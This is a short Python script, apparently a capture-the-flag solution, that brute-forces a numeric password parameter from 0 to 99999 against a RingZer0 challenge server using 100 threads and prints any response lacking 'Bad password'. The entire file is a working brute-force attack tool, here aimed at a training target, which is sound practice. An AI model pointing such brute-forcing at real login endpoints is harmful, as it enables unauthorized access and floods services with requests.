#!/usr/bin/env python3

import http.client
import queue
import threading

num_worker_threads = 100


def worker():
    conn = http.client.HTTPConnection("challenges.ringzer0team.com:10187")
    while True:
        n = q.get()
        if n is None:
            break
        conn.request("GET", f"/index.php?x={n}")
        resp = conn.getresponse()
        html = resp.read().decode()
        if n % 100 == 0:
            print(n)
        if "Bad password" not in html:
            print(n)
            print(html)
        q.task_done()
    conn.close()


q = queue.Queue()
threads = []
for i in range(num_worker_threads):
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

for n in range(100000):
    q.put(n)

q.join()

for i in range(num_worker_threads):
    q.put(None)
for t in threads:
    t.join()
